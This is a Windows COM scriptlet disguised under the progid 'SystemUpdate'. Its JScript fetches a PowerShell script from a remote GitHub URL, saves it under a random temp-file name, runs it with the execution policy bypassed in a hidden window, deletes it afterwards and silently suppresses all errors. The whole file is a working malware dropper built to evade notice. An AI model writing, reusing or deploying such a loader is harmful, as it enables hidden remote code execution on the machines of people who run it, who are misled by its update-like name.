<?XML version="1.0"?>
<scriptlet>
<registration progid="SystemUpdate" classid="{10001111-0000-0000-0000-0000FEEDACDC}"></registration>
<public>
</public>
<script language="JScript">
<![CDATA[
    try {
        // Download PowerShell script from GitHub
        var x = new ActiveXObject("Msxml2.XMLHTTP");
        x.open("GET", "https://raw.githubusercontent.com/rootkalilocalhost/modules/main/v3.ps1", false);
        x.send();
        
        if (x.status == 200) {
            var content = x.responseText;
            
            // Create temporary file with random name
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var tempFile = fso.GetSpecialFolder(2) + "\\~tmp" + Math.round(Math.random() * 10000) + ".ps1";
            var ts = fso.CreateTextFile(tempFile, true);
            ts.Write(content);
            ts.Close();
            
            // Execute PowerShell script with bypass and hidden window
            var s = new ActiveXObject("WScript.Shell");
            var cmd = 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + tempFile + '"';
            s.Run(cmd, 0, false); // Run without waiting for completion
            
            // Schedule cleanup after 120 seconds (2 minutes)
            setTimeout(function() {
                try { 
                    // Check if file exists before deletion
                    if (fso.FileExists(tempFile)) {
                        fso.DeleteFile(tempFile, true); // Force delete
                    }
                } catch(e) {
                    // Silent error handling for file deletion
                }
            }, 120000); // 120000 ms = 120 seconds = 2 minutes
        }
    } catch(e) {
        // Silent error handling for main execution
    }
]]>
</script>
</scriptlet>
